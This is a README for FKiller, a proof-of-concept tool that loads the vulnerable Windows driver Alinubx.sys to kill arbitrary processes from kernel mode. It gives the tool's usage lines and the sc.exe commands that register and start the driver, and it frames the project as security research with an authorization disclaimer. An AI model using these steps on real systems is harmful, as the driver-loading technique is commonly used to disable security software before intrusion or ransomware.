# FKiller — BYOVD PoC

FKiller is a BYOVD (Bring Your Own Vulnerable Driver) PoC demonstrating the exploitation of Alinubx.sys, a vulnerable Windows kernel-mode driver that can be abused to terminate processes.

The driver is listed on LOLDrivers and exposes process termination functionality due to insufficient access control.

This project is intended for Windows kernel security research, reverse engineering, malware analysis, and BYOVD research.

## Write-up

For the complete reverse engineering, vulnerability analysis, and exploitation process:

[RingZero Exploitation — Reverse Engineering & Exploiting Alinubx.sys](https://blog.ninjas.zip/ring-zero-exploitation/)

## Usage

FKiller accepts two command-line arguments:

`FKiller.exe <PID> [ExitCode]`

- "PID" — Process ID of the target process.
- "ExitCode" — Exit status passed to the driver. Optional; defaults to "0".

Example:

`FKiller.exe 1234`

With a custom exit code:

`FKiller.exe 1234 1`

## Driver Setup

Register Alinubx.sys as a kernel service:

`sc.exe create FKiller type= kernel binPath= "C:\Path\To\Alinubx.sys"`

Start the driver:

`sc.exe start FKiller`

Check the service status:

`sc.exe query FKiller`

When finished, stop and remove the service:

`sc.exe stop FKiller`
`sc.exe delete FKiller`

## Disclaimer

This project is intended for educational purposes, security research, malware analysis, and authorized testing only.

Run the PoC only in an isolated research environment or on systems you are explicitly authorized to test.

## Author
Developed by **Abolfazl**

Telegram: [@FallinBinary](https://t.me/FallinBinary)
